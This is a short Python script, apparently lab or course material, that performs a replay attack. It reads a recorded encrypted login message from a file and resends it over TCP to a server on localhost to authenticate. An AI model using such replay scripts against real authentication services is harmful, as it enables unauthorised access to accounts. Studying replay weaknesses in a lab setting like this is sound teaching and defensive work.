from socket import socket, AF_INET, SOCK_STREAM


class LoginAttack:
    def __init__(self, server, port):
        """
        Args:
            server (str) - the server address
            port (int) - the server port
        """

        self.server = server
        self.port = port

    def attack(self):
        """Authenticate to a vulnerable server using a previously recorded
        message (replay attack).
        """

        recorded = open('attack/recorded.enc', 'rb').read()

        sock = socket(AF_INET, SOCK_STREAM)
        sock.connect((self.server, self.port))
        sock.send(recorded)
        print(f'Response: {sock.recv(512).decode()}')


if __name__ == '__main__':
    attack = LoginAttack(server='localhost', port=9999)
    attack.attack()
